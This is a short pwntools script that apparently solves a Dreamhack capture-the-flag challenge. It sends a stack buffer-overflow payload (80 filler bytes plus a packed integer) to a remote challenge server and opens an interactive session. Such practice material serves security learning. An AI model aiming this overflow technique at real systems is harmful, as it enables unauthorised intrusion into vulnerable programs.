from pwn import *

p = remote('host2.dreamhack.games', 21494)

#e = ELF('pwnable/ctf-0422/chall')
#p = process('pwnable/ctf-0422/chall')

payload = b'A' * 80
payload += p32(0x1)
#payload += b'b'*0x08


p.sendline(payload)
p.interactive()